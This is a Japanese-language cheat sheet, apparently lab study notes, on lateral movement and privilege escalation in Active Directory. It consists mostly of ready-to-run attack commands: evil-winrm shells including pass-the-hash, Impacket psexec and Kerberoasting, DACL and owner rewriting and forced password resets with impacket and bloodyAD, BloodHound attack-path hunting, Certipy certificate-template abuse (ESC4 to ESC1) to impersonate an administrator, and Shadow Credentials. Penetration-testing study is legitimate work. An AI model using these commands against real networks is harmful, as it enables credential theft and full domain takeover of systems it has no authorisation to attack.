# 横展開
横展開、奪取済みのユーザから別のユーザへと移り変わっていくテクニック

## WinRM
WinRMサービスが有効(通常5985/tcp)かつ、資格情報とアクセス許可がある場合にはEvil-WinRMというツール使用し、インタラクティブなPoweShellを取得できる。
```
evil-winrm -i <ipアドレス> -u <ユーザ名> -p <パスワード>
```

NTLMハッシュがわかる場合、以下の通りでもシェルを貼れる
```
evil-winrm -i ホスト名 -u administrator -H ハッシュ
```


## Impacket
[Impacket](https://github.com/fortra/impacket)はネットワークプロトコルを操作するためのPythonクラスのコレクションと説明されているものの、Windowsシステムへの侵入やデータ送出に役立つツールが多く含まれている

Kali Linuxでは/usr/share/doc/python3-impacket/examplesにある。

参考：https://tools.thehacker.recipes/impacket

### PsExec
SMB経由で被害者マシンとの間にシェルを貼る
```
python psexec.py Administrator@10.129.59.97
```
参考：https://book.hacktricks.xyz/v/jp/windows-hardening/lateral-movement/psexec-and-winexec

### Kerberoasting攻撃でパスワードハッシュを取得する
```
python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
```
参考：https://www.crowdstrike.com/ja-jp/cybersecurity-101/cyberattacks/kerberoasting/

### mssqlclient
```
python3 mssqlclient.py 'sequel.htb/sa:MSSQLP@ssw0rd!@10.10.11.51'
```

### 所有者を変更する
```
impacket-owneredit -action write -new-owner 'user1' -target-dn '書き換え対象のDN' 'ドメイン名/user1':'user1のパスワード' -dc-ip DCのIP
```
参考：https://www.hackingarticles.in/abusing-ad-dacl-writeowner/

### user1がuser2のDACLを書き換え、フルアクセス権限を与える
```
impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'user1' -target 'user2' 'ドメイン名/user1':'user1のパスワード'
```


## Bloodhound
Windowsのドメイン情報を図示できるツール。攻撃経路を考えるのに使用できる。
Ingestorsを攻撃対象マシンで実行してドメイン情報を集め、Bloodhoundで図示する流れとなっている。

ドメイン情報の収集はbloodhound-pythonを使用すると良い。Ingestorsの実行ファイルを攻撃対象マシンに送信して実行するよりも楽に実行できる
```
bloodhound-python -u ユーザ名 -p パスワード -d ドメイン名 -ns ネームサーバーのIP -c All
```

BloodhoundはBloodhound LegacyとBloodhound CEがある。自身の環境に応じて使用しやすい方を選択すれば良い

参考：
https://qiita.com/v_avenger/items/56ef4ae521af6579c058
https://devblog.lac.co.jp/entry/20231012


以下のような流れでオブジェクトを調査していくと良い
1. SEARCHで現在奪取できているアカウントを検索
2. 検索結果で表示されたノードをクリックし、ノードの詳細を確認する。
* 「Outbound Object Control」をクリックすると、そのアカウントで閲覧・編集可能なノード（アカウント等）が表示される
    * 例えば、別ノード（アカウント等）に対してGenericAll権限を持っていればパスワードリセットを行える可能性がある。持っている権限に応じてどのように攻撃を行っていくか考えると良い。
    https://gitee.com/scriptkiddies/hacktricks/blob/master/windows/active-directory-methodology/acl-persistence-abuse.md
* その他「Inbound Object Control」や「Member Of」を確認することでそのアカウント行える操作等を推測できる
    * 証明書登録に関するユーザは権限昇格を行うことができる可能性
    https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#Active-Directory-Certificate-Services
3. 繋がっているノード（主に「Outbound Object Control」を調査）をクリックし、そのノードの詳細を確認する
4. 2～3を繰り返し、目的のノード（管理者権限を持つノードや権限昇格の可能性があるノード）を見つける
5. PATHFINDINGで現在奪取できているアカウントと目的のノードを指定し、他の経路が無いかも確認する


## BloodyAD
LinuxでADの操作を行うことができる
https://github.com/CravateRouge/bloodyAD

### user1がuser2のWriteOwner権限を持つときに、user2の所有者をuser1に変更する
```
bloodyAD --host 'IP' -d 'ドメイン名（例：test.htb）' -u 'user1' -p 'user1パスワード' set owner 'user2' 'user1'
```

### user1がuser2のDACLを書き換え、フルアクセス権限を与える
```
bloodyAD --host 'IP' -d 'ドメイン名' -u 'user1' -p 'user1パスワード' add genericAll 'user2' 'user1'
```

### user1がuser2のパスワードを変更
```
bloodyAD --host 'IP' -d 'ドメイン名' -u 'user1' -p 'user1パスワード' set password user2 user2の新パスワード
```

## Certipy-Ad
Active Directory 証明書サービス (AD CS) を列挙して悪用するための攻撃ツール。
Active Directoryの証明書の設定不備を狙った攻撃については以下を参照
https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/

### ADの脆弱な証明書テンプレートを探す
```
certipy-ad find -vulnerable -dc-ip 'IP' -u 'user1@example.htb' -p 'user1パスワード'  -stdout -debug
```
-pの代わりに-hashes 'NTハッシュ'でも可能

https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#Active-Directory-Certificate-Services

### ESC4（ユーザが証明書テンプレートを書き換え可能）の場合に、ESC1に対して脆弱な証明書テンプレートに書き換える
```
certipy-ad template -dc-ip 'IP' -u 'user1@example.htb' -p 'user1パスワード' -template 'EC4な証明書テンプレート名' -target '対象(例DC01.example.htb)' -save-old -debug
```

### ESC1に対して脆弱（クライアントが設定したSubject Alternative Name (SAN)を受け入れる）な場合に、任意ユーザのSANを追加した証明書テンプレートを取得する
```
certipy-ad req -dc-ip 'IP' -u 'user1@example.htb' -p 'user1パスワード' -ca 'CA名' -target '対象(例DC01.example.htb)' -template 'EC1な証明書テンプレート名' -upn 'SANに追加するUPN(例：administrator@example.htb)'
```

### PFXファイルを使用してNTハッシュを取得する
```
certipy-ad auth -pfx 'pfxファイル名' -dc-ip 'IP'
```

### Shadow Credentials
user1がuser2に対して十分な権限を持つ場合、NTハッシュを取得できる
user2のパスワードを書き換えたくない、またはKerberoasting攻撃で取得したハッシュを復号できない場合などに使用できる
```
certipy-ad shadow auto -u 'user1@example.htb' -p "user1パスワード" -account 'user2' -dc-ip 'IP'
```

https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab